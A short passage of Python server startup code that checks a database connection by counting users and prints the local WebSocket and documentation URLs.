    conn = get_db_connection()
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) as count FROM users")
            result = cursor.fetchone()
            print(f"✅ Database connected - Users: {result['count']}")
        except Exception as e:
            print(f"❌ Database test failed: {e}")
    else:
        print("⚠️  Database connection failed - Running in development mode")
    
    print(f"🔗 WebSocket endpoints:")
    print(f"   • Admin: ws://localhost:{PORT}/ws/admin")
    print(f"   • Client: ws://localhost:{PORT}/ws/client/{{client_id}}")
    print(f"📚 Documentation: http://localhost:{PORT}/docs")



